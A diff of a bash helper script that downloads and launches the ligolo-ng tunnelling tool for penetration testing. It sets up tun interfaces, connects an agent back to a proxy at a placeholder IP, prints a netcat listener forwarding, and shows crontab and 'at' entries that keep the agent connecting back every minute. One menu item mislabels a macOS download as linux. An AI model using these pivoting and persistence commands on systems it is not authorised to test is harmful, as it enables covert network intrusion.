@@ -1,49 +1,228 @@
 #!/usr/bin/env bash
 
-echo ""
-echo "_________________________________________________________"
-echo ""
-echo "AMD64"
-echo "Ligolo-ng Proxy 0.5.1 Linux"
-echo ""
+                
 
-# Pregunta y descarga directamente si la respuesta es afirmativa
-read -n1 -p "¿Deseas descargar el proxy? [s/N] " descargar_proxy
-echo ""
-if [[ "$descargar_proxy" == "S" ]] || [[ "$descargar_proxy" == "s" ]]; then
-    wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz
-    tar xzf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz > /dev/null
+if [[ "$1" == "-2" ]]; then
+    # Función para mostrar mensajes con formato
+    echo_msg() {
+        echo ""
+        echo -e "\033[1;32m==============================================\033[0m"
+        echo -e "\033[1;33m$1\033[0m"
+        echo -e "\033[1;32m==============================================\033[0m"
+        echo ""
+    }
 
-    #tar xzvf ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz -q
-fi
-
-echo ""
-echo "_________________________________________________________"
-echo ""
-
-# Pregunta y configura la interfaz directamente si la respuesta es afirmativa
-read -n1 -p "¿Quieres iniciar la interfaz? [s/N] " iniciar_interfaz
-echo ""
-if [[ "$iniciar_interfaz" == "S" ]] || [[ "$iniciar_interfaz" == "s" ]]; then
-    sudo ip tuntap add user $USER mode tun ligolo
-    sudo ip link set ligolo up
-    ip a | grep ligolo
+    read -n1 -p "¿Comandos de PROXY y ejecución completa? [s/N]: " execute_all
     echo ""
+    if [[ $execute_all =~ ^[Ss]$ ]]; then
+        echo_msg "PROXY"
+        echo -e "\033[1;36mComandos para PROXY\033[0m"
+        echo ""
+        echo -e "\033[1;37m1.- Regresar a la sesión del proxy: session\033[0m"
+        echo -e "\033[1;37m2.- Para empezar el proxy: start\033[0m"
+        echo ""
+        echo -e "\033[1;37mPara borrar la subnet: sudo ip link delete ligolo\033[0m"
+        echo -e "\033[1;37msudo ip link delete ligolo\033[0m"
+        echo -e "\033[1;37msudo ip route add 1.1.1.0/24 dev ligolo\033[0m"
+        echo ""
+        echo -e "\033[1;34m#second tunnel\033[0m"
+        echo -e "\033[1;34m      sudo ip tuntap add user \$USER mode tun ligolo2\033[0m"
+        echo -e "\033[1;34m      sudo ip link set ligolo2 up\033[0m"
+        echo -e "\033[1;34m      sudo ip route add X.X.X.0/24 dev ligolo2\033[0m"
+        echo -e "\033[1;34m      start --tun ligolo2\033[0m"
+        echo ""
+        echo " listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 -tcp"
+        echo "nc -nlvp 10000  "
+        echo "sheldon1 IP"
+        echo ""
+
+
+
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+        read -p "¿Cuál es la subnet del agente (ejemplo: 192.168.1.0/24)? " selected_subnet
+        echo ""
+        echo_msg "Comando a ejecutar"
+        echo ""
+        echo -e "\033[1;37msudo ip route add \$selected_subnet dev ligolo\033[0m"
+        sudo ip route add "$selected_subnet" dev ligolo
+        echo_msg "Comando ejecutado"
+        echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+    else
+        echo_msg "Continue..."
+        
+    fi
+
+    echo ""
+    echo_msg "Comandos del AGENTE"
+    echo -e "\033[1;37m./agent -connect IP:11601 -ignore-cert\033[0m"
+    echo ""
+
+    echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+    echo ""
+
+    read -n1 -p "¿Desea ver los comandos de ejecución de nuevo? [s/N]: " view_commands
+    echo ""
+    if [[ $view_commands =~ ^[Ss]$ ]]; then
+        echo_msg "AGENTE"
+        echo -e "\033[1;37m./agent -connect IP:11601 -ignore-cert\033[0m"
+        echo_msg "Proxy"
+        echo -e "\033[1;37m./proxy -selfcert\033[0m"
+    fi
+
+    echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+    echo ""
+
+    read -n1 -p "¿Desea ver cómo usar crontabs? [s/N]: " view_crontabs
+    echo ""
+    if [[ $view_crontabs =~ ^[Ss]$ ]]; then
+        echo_msg "Crontabs"
+        echo -e "\n\033[1;35m_________________________________________________________\033[0m\n"
+        echo -e "\033[1;37mAgregar a crontab:\033[0m"
+        echo -e "\033[1;37mcrontab -e\033[0m"
+        echo -e "\033[1;37m* * * * * cd /home/ass && ./agent -connect IP:11601 -ignore-cert\033[0m"
+        echo ""
+        echo -e "\033[1;37mCon 'at':\033[0m"
+        echo -e "\033[1;37mecho '/home/ass/agent -connect IP:11601 -ignore-cert' | at now + 1 minute\033[0m"
+    fi
+
+    echo_msg "FIN"
+    echo ""
+    echo -e "\n\033[1;31m_________________________________________________________\033[0m\n"
+    echo -e "\033[1;31mADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.\033[0m"
+    exit 0
 fi
+
+clear
+
+echo_msg() {
+    echo ""
+    echo "=============================================="
+    echo -e "\033[$1m$2\033[0m"
+    echo "=============================================="
+    echo ""
+}
+
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+echo -e "\033[1;31m\033[1m>>> For the other instrucciones : proxyloco -2 <<<\033[0m"
+echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+
+echo -e "\033[1;34mFor agent:\033[0m"
+echo -e "\033[1;32m./agent -connect IP:11601 -ignore-cert\033[0m"
+echo -e "\n\033[1;33m_________________________________________________________\033[0m\n"
+
+
+
+echo -e "\033[31mAMD64\033[0m"
+echo "1. ligolo-ng Agent 0.5.1 linux"
+echo "2. ligolo-ng Proxy 0.5.1 linux"
+echo ""
+echo -e "\033[32mARM64\033[0m"
+echo "3. ligolo-ng Agent 0.5.1 linux"
+echo "4. ligolo-ng Proxy 0.5.1 linux"
+echo ""
+echo "_________________________________________________________"
+echo ""
+
+while true; do
+    read -p "Choose the number of the download you want: " option
+    echo ""
+    echo "_________________________________________________________"
+    echo ""
+
+    case $option in
+        1)
+            wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_linux_amd64.tar.gz
+            file="ligolo-ng_agent_0.5.1_linux_amd64.tar.gz"
+            break
+            ;;
+        2)
+            wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz
+            file="ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz"
+            break
+            ;;
+        3)
+            wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_darwin_arm64.tar.gz
+            file="ligolo-ng_agent_0.5.1_darwin_arm64.tar.gz"
+            break
+            ;;
+        4)
+            wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_arm64.tar.gz
+            file="ligolo-ng_proxy_0.5.1_linux_arm64.tar.gz"
+            break
+            ;;
+        *)
+            echo_msg "31" "Invalid option. Try again."
+            ;;
+    esac
+done
 
 echo ""
 echo "_________________________________________________________"
 echo ""
 
-# Pregunta y inicia el proxy directamente si la respuesta es afirmativa
-read -n1 -p "¿Quieres iniciar el proxy? [s/N] " iniciar_proxy
+tar xzvf $file
 echo ""
-if [[ "$iniciar_proxy" == "S" ]] || [[ "$iniciar_proxy" == "s" ]]; then
-    echo "Iniciando el proxy..."
-    ./proxy -selfcert
-fi
+
+echo_msg "35" "More agents at: https://github.com/nicocha30/ligolo-ng/releases"
+echo ""
+
+while true; do
+    read -n1 -p "Continue with Agent (a) or Proxy (p)? " choice
+    echo ""
+    echo "_________________________________________________________"
+    echo ""
+
+    if [ "$choice" == "a" ]; then
+        echo_msg "34" "Installing the agent..."
+        read -p "What is the proxy's IP address? " IP
+        echo "omit -ignore-cert for lab purposes"
+        echo ""
+        command="./agent -connect $IP:11601 -ignore-cert"
+        echo_msg "36" "Executing command in 1 second:"
+        echo ""
+        echo " $command"
+        echo ""
+        echo "_________________________________________________________"
+        echo ""
+        sleep 1
+        $command
+        break
+    elif [ "$choice" == "p" ]; then
+        read -n1 -p "Do you want to start the interface? [Y/n] " start_interface
+        start_interface=${start_interface:-Y}
+        echo ""
+        if [[ "$start_interface" =~ ^[Yy]$ ]]; then
+            echo "sudo ip tuntap add user $USER mode tun ligolo"
+            echo "sudo ip link set ligolo up"
+            sudo ip tuntap add user $USER mode tun ligolo
+            sudo ip link set ligolo up
+            ip a | grep ligolo
+            sleep 1
+            echo ""
+
+            read -n1 -p "Do you want to start the proxy? [Y/n] " start_proxy
+            start_proxy=${start_proxy:-Y}
+            echo ""
+            if [[ "$start_proxy" =~ ^[Yy]$ ]]; then
+                echo_msg "32" "Starting the proxy..."
+                echo ""
+                echo "./proxy -selfcert"
+                echo "_________________________________________________________"
+                echo ""
+                echo "Note: -selfcert is for lab use without an internet connection."
+                echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+                echo -e "\033[1;31m\033[1m>>> Open another terminal and execute: proxyloco -2 <<<\033[0m"
+                echo -e "\n\033[1;34m_________________________________________________________\033[0m\n"
+                sleep 1
+                ./proxy -selfcert
+            fi
+        fi
+        break
+    else
+        echo_msg "31" "Invalid option. Try again."
+    fi
+done
 
 echo ""
 echo "_________________________________________________________"
 echo ""
-rm -f LICENSE README.md ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz
